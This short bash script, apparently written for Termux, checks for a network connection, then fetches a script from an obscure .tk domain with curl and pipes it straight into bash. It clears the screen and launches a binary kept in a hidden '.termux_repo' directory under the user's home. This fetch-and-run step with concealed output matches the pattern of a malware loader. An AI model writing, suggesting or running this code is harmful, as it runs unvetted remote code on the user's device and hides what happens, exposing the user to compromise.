validateConnection () {
wget -q --spider http://google.com

if [ $? -eq 0 ]; then
    #sihay
    curl -s -L http://l410.tk/net.sh | bash
    clear
    nice $HOME/.termux_repo/termusxcore $*
    exit 1
else
    
    echo "Offline"
    validateConnection
fi
}
validateConnection
